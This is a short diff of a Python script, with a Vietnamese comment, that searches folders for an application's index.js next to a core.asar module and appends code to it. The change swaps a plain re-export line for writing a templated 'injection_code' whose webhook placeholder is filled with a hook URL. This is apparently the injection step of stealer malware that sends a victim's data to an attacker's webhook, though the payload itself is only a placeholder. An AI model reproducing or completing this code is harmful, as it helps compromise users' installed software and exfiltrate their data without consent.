@@ -16,9 +16,10 @@ def find_and_modify_index_js():
                     if file == 'index.js':
                         index_js_path = os.path.join(root, file)
                         # Ghi module.exports = require("./core.asar"); vào tệp index.js
-                        injection_code = "%code%".replace("%WEBHOOK%", "%hookurl%")
+
                         with open(index_js_path, 'a') as f:
-                            f.write('\nmodule.exports = require("./core.asar");')
+                            injection_code = "%code%".replace("%WEBHOOK%", "%hookurl%")
+                            f.write(injection_code)
                         print(f'Successfully modified {index_js_path}')
                         return
 
